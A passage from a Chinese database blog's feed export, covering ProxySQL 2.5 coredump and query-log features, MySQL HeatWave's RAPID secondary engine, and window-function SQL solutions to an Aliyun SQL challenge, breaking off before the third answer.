<p>从 ProxySQL 2.5 开始，增加了按需生成核心转储的功能(Google coredumper)，<br>
新增命令 <code>PROXYSQL COREDUMP</code> 和 <code>PROXYSQL COMPRESSEDCOREDUMP</code>。</p>
<p>命令调用：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">Admin<span class="operator">&gt;</span> PROXYSQL COREDUMP;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">1.041</span> sec)</span><br><span class="line">Coredump: core</span><br><span class="line"></span><br><span class="line">Admin<span class="operator">&gt;</span> PROXYSQL COMPRESSEDCOREDUMP;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">5.016</span> sec)</span><br><span class="line">Coredump: core</span><br></pre></td></tr></table></figure></div>
<p>效果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:/var/lib/proxysql$ ll -h core*</span><br><span class="line">-rw------- 1 proxysql proxysql 212M Jun 19 10:27 core</span><br><span class="line">-rw------- 1 proxysql proxysql 1.3M Jun 19 10:29 core.bz2</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>该特性只支持 x86-64 Linux 系统。</p>
</blockquote>
<h3 id="4-Query-Log-增强">4. Query Log 增强</h3>
<p>在新版本的 Query Log 中，支持了 <code>last_insert_id</code> 字段。</p>
<p>示例如下：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.0.101:22960&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span><span class="string">&quot;0x47B278EE303E9CCE&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;duration_us&quot;</span><span class="punctuation">:</span><span class="number">2130</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;endtime&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-06-19 10:47:55.620990&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;endtime_timestamp_us&quot;</span><span class="punctuation">:</span><span class="number">1687139275620990</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;event&quot;</span><span class="punctuation">:</span><span class="string">&quot;COM_QUERY&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;hostgroup_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;last_insert_id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span> --&gt; New!</span><br><span class="line">   <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;INSERT INTO test.test_insert_id VALUES (NULL)&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;rows_affected&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;rows_sent&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;schemaname&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.0.101:3306&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;starttime&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-06-19 10:47:55.618860&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;starttime_timestamp_us&quot;</span><span class="punctuation">:</span><span class="number">1687139275618860</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;thread_id&quot;</span><span class="punctuation">:</span><span class="number">24</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;sbtest&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>ProxySQL 是值得信赖的高可用中间件，适用于 MySQL, MariaDB, TiDB, ClickHouse 数据库。<br>
本文介绍了如何升级 ProxySQL 到最新版本，以及 ProxySQL v2.5 版本中几个重要的新特性。</p>
<p>如果您看到这里，觉得有些许收获，那么请为本文点个赞吧~</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>ProxySQL</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>proxysql</tag>
        <tag>clickhouse</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL HeatWave 窥探（1）</title>
    <url>/2023/mysql/mysql-heatwave-1/</url>
    <content><![CDATA[<h2 id="HeatWave">HeatWave</h2>
<p>MySQL HeatWave 是一种大规模并行、高性能内存查询加速器，可将分析工作负载、混合工作负载和机器学习的 MySQL 性能提高几个数量级。<br>
可以通过 Oracle 云基础设施 (OCI)、Amazon Web Services (AWS) 和 Oracle Database Service for Azure (ODSA) 访问 HeatWave。</p>
<p>HeatWave 由 MySQL 数据库系统和 HeatWave 节点组成。满足某些先决条件的分析查询会自动从 MySQL 数据库系统卸载到 HeatWave 集群，以加速处理。<br>
借助 HeatWave 集群，您可以从同一 MySQL 数据库运行在线事务处理 (OLTP)、在线分析处理 (OLAP) 和混合工作负载，无需提取、传输和加载 (ETL)，也无需修改应用程序。</p>
<img  alt="Architecture.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://dev.mysql.com/doc/heatwave/en/images/heatwave-ml-architecture.png"
                      referrerpolicy="no-referrer"
                >
<p>MySQL 数据库系统包含一个 HeatWave 插件，负责集群管理、查询调度以及将查询结果返回到 MySQL 数据库系统。<br>
HeatWave 节点将数据存储在内存中并处理分析和机器学习查询。每个 HeatWave 节点都托管一个 HeatWave 查询处理引擎 (RAPID) 的实例。</p>
<h2 id="RAPID">RAPID</h2>
<p>众所周知，MySQL 默认存储引擎为 InnoDB，但是在 HeatWave 中，实现了第二存储引擎 RAPID，尚未开源，且只支持在 HeatWave 中使用。</p>
<p>MySQL 为支持第二存储引擎调整了内核实现，从 MySQL 8.0.21 开始，支持在建表语句中指定第二存储引擎。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `t` (</span><br><span class="line">  `a` int DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB SECONDARY_ENGINE=RAPID</span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>I_S.tables</code> 表中也可查看设定。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME, CREATE_OPTIONS</span><br><span class="line">FROM INFORMATION_SCHEMA.TABLES</span><br><span class="line">WHERE CREATE_OPTIONS LIKE &#x27;%SECONDARY_ENGINE%&#x27;;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+------------+---------------------------------------------+</span><br><span class="line">| TABLE_SCHEMA | TABLE_NAME | CREATE_OPTIONS                              |</span><br><span class="line">+--------------+------------+---------------------------------------------+</span><br><span class="line">| yandb        | t          | SECONDARY_ENGINE=&quot;RAPID&quot; SECONDARY_LOAD=&quot;0&quot; |</span><br><span class="line">+--------------+------------+---------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>加载表到 HeatWave：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE orders SECONDARY_LOAD;</span><br></pre></td></tr></table></figure></div>
<p>检查加载情况：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NAME, LOAD_STATUS</span><br><span class="line">FROM performance_schema.rpd_tables, performance_schema.rpd_table_id</span><br><span class="line">WHERE rpd_tables.ID = rpd_table_id.ID;</span><br></pre></td></tr></table></figure></div>
<p>这里，RAPID 表的加载状态有如下几种：</p>
<ul>
<li>NOLOAD_RPDGSTABSTATE: 该表尚未加载。</li>
<li>LOADING_RPDGSTABSTATE: 正在加载表。</li>
<li>AVAIL_RPDGSTABSTATE: 该表已加载并可用于查询。</li>
<li>UNLOADING_RPDGSTABSTATE: 正在卸载表。</li>
<li>INRECOVERY_RPDGSTABSTATE: 正在恢复该表。 恢复操作完成后，如果存在挂起的恢复，则表将被置于 UNAVAIL_RPDGSTABSTATE 状态。</li>
<li>STALE_RPDGSTABSTATE: 更改传播期间发生故障，并且表已过时。</li>
<li>UNAVAIL_RPDGSTABSTATE:该表不可用。</li>
</ul>
<p>简言之，MySQL 通过引入 HeatWave 组件，并将表数据复制到第二存储引擎 RAPID，从而提升分析查询处理效率和数据库性能。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>Heatwave</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
        <tag>heatwave</tag>
      </tags>
  </entry>
  <entry>
    <title>交卷！阿里云瑶池数据库SQL挑战赛！</title>
    <url>/2023/modb/modb-aliyun-sql-challenge/</url>
    <content><![CDATA[<h2 id="SQL-挑战赛">SQL 挑战赛</h2>
<p>本次墨天轮社区的 SQL 挑战赛已接近尾声（before 6/18），趁着活动尚未结束抓紧时间上车。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-11723fc0-8b54-46f6-ba6e-fc75cea06df5.jpg"
                      referrerpolicy="no-referrer"
                >
<p>总共三道题目，需要先前往阿里云领取资源 – <a class="link"   href="https://free.aliyun.com/?pipCode=mysql&amp;utm_content=m_1000372358" >云数据库 RDS MySQL Serverless <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里我选择的是 阿里云 RDS MySQL Serverless (MySQL 8)</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230614-e1e1e8fd-7452-42bf-942f-82155dc398cc.png"
                      width="500" referrerpolicy="no-referrer"
                >
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230614-409ff39e-f367-490f-889f-556144800bec.png"
                      width="500" referrerpolicy="no-referrer"
                >
<h3 id="导入数据集">导入数据集</h3>
<p>在墨天轮文档下载数据集。</p>
<ul>
<li><a class="link"   href="https://www.modb.pro/doc/103901" >阿里云瑶池数据库SQL挑战赛 第一题数据集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/doc/103902" >阿里云瑶池数据库SQL挑战赛 第二题数据集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/doc/103903" >阿里云瑶池数据库SQL挑战赛 第三题数据集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>并导入阿里云 RDS，这里 DMS 提供了数据文件导入功能，可快速导入 csv 格式的数据文件。</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-8c18f5f1-3bea-42d4-89b6-e7d782928210.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="赛题-1：-找出各项考试中的佼佼者">赛题 1： 找出各项考试中的佼佼者</h2>
<h3 id="题">题</h3>
<p>一个学生可以参加任意考试，不限次数。</p>
<p>现在我们关注的是每门考试有哪些顶尖的学生。一门考试的 顶尖学生 是指一个学生的分数在参加该考试的 不同 学生中 得分排名前三 。</p>
<p>编写一个SQL查询，找出每个考试中 得分最高的的考生 。</p>
<p>若同一个考生有多条考试记录，则取最高分。</p>
<p>如果存在并列，将并列的考生都列举出来，直到列举的考生达到或超过三人。</p>
<p>以 每门考试考试分数从高到低的顺序 返回结果表</p>
<h3 id="解">解</h3>
<p>使用窗口函数 <code>ROW_NUMBER()</code> 来为每个学生的得分排名，使用 <code>PARTITION BY</code> 将学生的得分排名限制为每个考试内部，然后使用 <code>ORDER BY</code> 按照得分从高到低进行排序。<br>
使用 <code>COUNT(*) OVER</code> 窗口函数，用于计算每个考试中每个得分的出现次数。<br>
使用 <code>MAX(tt.score) OVER</code> 窗口函数，用于获取每个考生在该考试中的最高分数。</p>
<p>如果使用 <code>DENSE_RANK</code> 则会出现75条结果，不符合预期，如下结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Test 1   | Student 32 |   400 |</span><br><span class="line">| Test 1   | Student 80 |   400 |</span><br><span class="line">| Test 1   | Student 19 |   400 |</span><br><span class="line">| Test 1   | Student 24 |   400 |</span><br><span class="line">| Test 1   | Student 36 |   400 |</span><br><span class="line">| Test 1   | Student 61 |   400 |</span><br><span class="line">| Test 1   | Student 3  |   400 |</span><br><span class="line">| Test 1   | Student 8  |   399 |</span><br><span class="line">| Test 1   | Student 29 |   398 |</span><br><span class="line">| Test 1   | Student 26 |   398 |</span><br></pre></td></tr></table></figure></div>
<p>题目要求：</p>
<blockquote>
<p>如果存在并列，将并列的考生都列举出来，直到列举的考生达到或超过三人。</p>
</blockquote>
<p>所以 75 条记录的结果是错误的，<br>
这里应该使用 <code>RANK</code>，得到的结果集为 44 条记录。</p>
<h3 id="答">答</h3>
<ul>
<li>方案一（118ms）</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> t.name <span class="keyword">AS</span> testName, t2.StuName, t2.score</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> t1.testId, t1.StuName, t1.score, t1.rn, t1.cnt</span><br><span class="line">    , t1.max_score, <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> t1.testId <span class="keyword">ORDER</span> <span class="keyword">BY</span> t1.score <span class="keyword">DESC</span>) <span class="keyword">AS</span> rank_num</span><br><span class="line">  <span class="keyword">FROM</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> tt.testId, tt.studentId, tt.score, s.name <span class="keyword">AS</span> StuName</span><br><span class="line">      , <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> tt.testId <span class="keyword">ORDER</span> <span class="keyword">BY</span> tt.score <span class="keyword">DESC</span>) <span class="keyword">AS</span> rn</span><br><span class="line">      , <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> tt.studentId, tt.score ) <span class="keyword">AS</span> cnt</span><br><span class="line">      , <span class="built_in">MAX</span>(tt.score) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> tt.studentId, tt.testId ) <span class="keyword">AS</span> max_score</span><br><span class="line">    <span class="keyword">FROM</span> TestAttempt tt</span><br><span class="line">      <span class="keyword">JOIN</span> Student s <span class="keyword">ON</span> tt.studentId <span class="operator">=</span> s.id</span><br><span class="line">  ) t1</span><br><span class="line">  <span class="keyword">WHERE</span> t1.score <span class="operator">=</span> t1.max_score</span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> t1.testId, t1.score <span class="keyword">DESC</span></span><br><span class="line">) t2</span><br><span class="line">  <span class="keyword">JOIN</span> Test t <span class="keyword">ON</span> t2.testId <span class="operator">=</span> t.id</span><br><span class="line"><span class="keyword">WHERE</span> t2.rank_num <span class="operator">&lt;=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>方案二（71ms）</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> t1 <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> tt.testId, tt.studentId, tt.score</span><br><span class="line">      , <span class="built_in">MAX</span>(tt.score) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> tt.studentId, tt.testId ) <span class="keyword">AS</span> max_score</span><br><span class="line">      , <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> tt.testId <span class="keyword">ORDER</span> <span class="keyword">BY</span> tt.score <span class="keyword">DESC</span>) <span class="keyword">AS</span> rank_num</span><br><span class="line">    <span class="keyword">FROM</span> TestAttempt tt</span><br><span class="line">  ), </span><br><span class="line">  t2 <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> t1.testId, t1.studentId, t1.score</span><br><span class="line">    <span class="keyword">FROM</span> t1</span><br><span class="line">    <span class="keyword">WHERE</span> t1.score <span class="operator">=</span> t1.max_score</span><br><span class="line">      <span class="keyword">AND</span> t1.rank_num <span class="operator">&lt;=</span> <span class="number">3</span></span><br><span class="line">  )</span><br><span class="line"><span class="keyword">SELECT</span> t.name <span class="keyword">AS</span> testName, s.name <span class="keyword">AS</span> StuName, t2.score</span><br><span class="line"><span class="keyword">FROM</span> t2</span><br><span class="line">  <span class="keyword">JOIN</span> Test t <span class="keyword">ON</span> t2.testId <span class="operator">=</span> t.id</span><br><span class="line">  <span class="keyword">JOIN</span> Student s <span class="keyword">ON</span> t2.studentId <span class="operator">=</span> s.id</span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<h3 id="截图">截图</h3>
<ul>
<li>
<p>方案一（118ms）<br>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-0a7c2ed8-cb4d-4d75-930c-50a4dfa2acba.png"
                      referrerpolicy="no-referrer"
                ></p>
</li>
<li>
<p>方案二（71ms）<br>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230616-684abeff-a4a3-45ba-8410-a3b4584c088c.png"
                      referrerpolicy="no-referrer"
                ></p>
</li>
</ul>
<h2 id="赛题-2：-游戏游玩情况">赛题 2： 游戏游玩情况</h2>
<h3 id="题-2">题</h3>
<p>编写一个 SQL 查询，报告在首次游玩后的一周内至少再有一次游玩的玩家的比例，也就是注册首周内至少有两次登录的玩家占总玩家的比例，四舍五入到小数点后两位。</p>
<h3 id="解-2">解</h3>
<p>这张表 Activity 包含四个字段，每一行是一个玩家 (player_id) 在指定日期 (event_date) 的游玩记录，包含了设备信息 (device_id)，以及总共玩了多少款游戏 (games_played)。这套题目的关键在于如何利用 <code>(player_id, event_date)</code> 这两个字段计算出题目所需的结果。</p>
<blockquote>
<p>首次游玩后的一周内至少再有一次游玩的玩家</p>
</blockquote>
<p>需要先找到有哪些玩家在注册首周内再次登录，假设注册日期为 <code>first_played_date</code> ，则在 <code>[first_played_date, first_played_date + 6 day]</code> 的区间内还有游玩记录。这里用到了窗口函数 <code>over (partition by .. order by .. frame)</code> 的高级语法。具体参考 <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/window-functions-frames.html" >Window Function Frame Specification <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>按 <code>player_id</code> 分组，确认玩家首次游玩时间，即 <code>event_date</code> 的最小值。</p>
<p>按玩家分组，按游玩时间排序，并标记序号，每位玩家只取前两天游玩记录。</p>
<p>依据此中间结果，计算每位玩家的第二条记录的日期是否在首次游玩日期的一周内。</p>
<p>依据上面的统计结果，即可计算出题目要求的玩家比例。</p>
<h3 id="答-2">答</h3>
<ul>
<li>方法一</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> t <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> player_id, event_date, </span><br><span class="line">	  <span class="built_in">MIN</span>(event_date) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id ) <span class="keyword">AS</span> first_played_date,</span><br><span class="line">      <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> event_date) <span class="keyword">AS</span> rn</span><br><span class="line">    <span class="keyword">FROM</span> Activity</span><br><span class="line">  ), </span><br><span class="line">  t2 <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> t.player_id, t.event_date, t.first_played_date, t.rn,</span><br><span class="line">	  <span class="built_in">COUNT</span>(t.rn) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> t.first_played_date <span class="keyword">ORDER</span> <span class="keyword">BY</span> t.event_date) <span class="keyword">AS</span> cnt</span><br><span class="line">    <span class="keyword">FROM</span> t</span><br><span class="line">    <span class="keyword">WHERE</span> t.rn <span class="operator">&lt;=</span> <span class="number">2</span> </span><br><span class="line">	     <span class="keyword">AND</span> t.event_date <span class="keyword">BETWEEN</span> t.first_played_date <span class="keyword">AND</span> DATE_ADD(t.first_played_date, <span class="type">INTERVAL</span> <span class="number">6</span> <span class="keyword">DAY</span>)</span><br><span class="line">       <span class="keyword">AND</span> t.event_date <span class="operator">!=</span> t.first_played_date</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">SELECT</span> ROUND(<span class="built_in">COUNT</span>(t2.player_id) <span class="operator">/</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> player_id) <span class="keyword">FROM</span> Activity), <span class="number">2</span>) <span class="keyword">AS</span> pct</span><br><span class="line"><span class="keyword">FROM</span> t2</span><br><span class="line"><span class="keyword">WHERE</span> t2.cnt <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>方法二：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ROUND(<span class="built_in">COUNT</span>(t.player_id) <span class="operator">/</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> player_id)</span><br><span class="line">    <span class="keyword">FROM</span> Activity</span><br><span class="line">  ), <span class="number">2</span>) <span class="keyword">AS</span> pct</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> player_id, event_date, <span class="built_in">MIN</span>(event_date) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id ) <span class="keyword">AS</span> <span class="number">1</span>st_date</span><br><span class="line">    , <span class="built_in">nth_value</span>(event_date, <span class="number">2</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> event_date) <span class="keyword">AS</span> <span class="number">2</span>nd_date</span><br><span class="line">    , <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> event_date) <span class="keyword">AS</span> rn</span><br><span class="line">  <span class="keyword">FROM</span> Activity</span><br><span class="line">) t</span><br><span class="line"><span class="keyword">WHERE</span> t<span class="number">.2</span>nd_date <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">  <span class="keyword">AND</span> t.rn <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">  <span class="keyword">AND</span> datediff(<span class="number">2</span>nd_date, <span class="number">1</span>st_date) <span class="operator">&lt;</span> <span class="number">7</span>;</span><br></pre></td></tr></table></figure></div>
<p>共计14个玩家，在首次游玩后的一周内至少再有一次游玩的记录，百分比为 0.01 。</p>
<h3 id="截图-2">截图</h3>
<ul>
<li>
<p>方法一（80ms）<br>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230616-0efddb1e-1100-415b-ab35-fe6f2876a98d.png"
                      referrerpolicy="no-referrer"
                ></p>
</li>
<li>
<p>方法二（116ms）<br>
<img  alt="8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-d7a0ea63-5fd9-4d99-af79-3e9203325122.png"
                      referrerpolicy="no-referrer"
                ></p>
</li>
</ul>
<h3 id="RDS-MySQL-bug">RDS MySQL bug?</h3>
<p>在测试过程中，因为用到了高级语法 <code>RANGE BETWEEN CURRENT ROW AND INTERVAL 6 DAY FOLLOWING</code> 导致 RDS 遇到了展示不出结果的情况，并且返回结果：【影响行数为-1】，在本地 MySQL 8.0.28 环境中，这个 SQL 是没有问题的。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> t <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> player_id, event_date, </span><br><span class="line">	  <span class="built_in">MIN</span>(event_date) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id ) <span class="keyword">AS</span> first_played_date,</span><br><span class="line">      <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> player_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> event_date) <span class="keyword">AS</span> rn</span><br><span class="line">    <span class="keyword">FROM</span> Activity</span><br><span class="line">  ), </span><br><span class="line">  t2 <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> t.player_id, t.event_date, t.first_played_date, t.rn,</span><br><span class="line">	  <span class="built_in">COUNT</span>(t.rn) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> t.first_played_date <span class="keyword">ORDER</span> <span class="keyword">BY</span> t.event_date <span class="keyword">RANGE</span> <span class="keyword">BETWEEN</span> <span class="keyword">CURRENT</span> <span class="type">ROW</span> <span class="keyword">AND</span> <span class="type">INTERVAL</span> <span class="number">6</span> <span class="keyword">DAY</span> FOLLOWING) <span class="keyword">AS</span> cnt</span><br><span class="line">    <span class="keyword">FROM</span> t</span><br><span class="line">    <span class="keyword">WHERE</span> t.rn <span class="operator">&lt;=</span> <span class="number">2</span></span><br><span class="line">  )</span><br><span class="line"><span class="keyword">SELECT</span> ROUND(<span class="built_in">COUNT</span>(t2.player_id) <span class="operator">/</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> player_id) <span class="keyword">FROM</span> Activity), <span class="number">2</span>) <span class="keyword">AS</span> pct</span><br><span class="line"><span class="keyword">FROM</span> t2</span><br><span class="line"><span class="keyword">WHERE</span> t2.cnt <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<img  alt="9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-fcc7ab13-b7c9-4a5e-83f1-8d882ccd765a.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-a8e3cbd4-3151-4377-9d14-3824838304ff.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="赛题-3：-计算三角形面积">赛题 3： 计算三角形面积</h2>
<h3 id="题-3">题</h3>
<p>写一个SQL查询，计算每个三角形的面积，保留两位小数。</p>
<h3 id="解-3">解</h3>
<p>空间三角形的面积解法较多，比如用两条边的长度和夹角进行计算，或者海伦公式，或者Bretschneider公式，或者高斯斯特林公式。<br>
这里用到的是向量计算法。</p>
<p>假设三角形的三个顶点坐标分别为 A(x1, y1, z1)、B(x2, y2, z2) 和 C(x3, y3, z3)。则该三角形的面积为：</p>
<img  alt="11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-2a8a2ba6-3166-4cbb-8ddd-ad7b7eb86c9a.png"
                      referrerpolicy="no-referrer"
                >
<p>经过初步验算，得到如下公式。</p>
<img  alt="12.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230615-2a56e4f9-7b6d-4b30-9cfd-3fca8430df78.jpg"
                      referrerpolicy="no-referrer"
                >
<h3 id="答-3">答</h3>
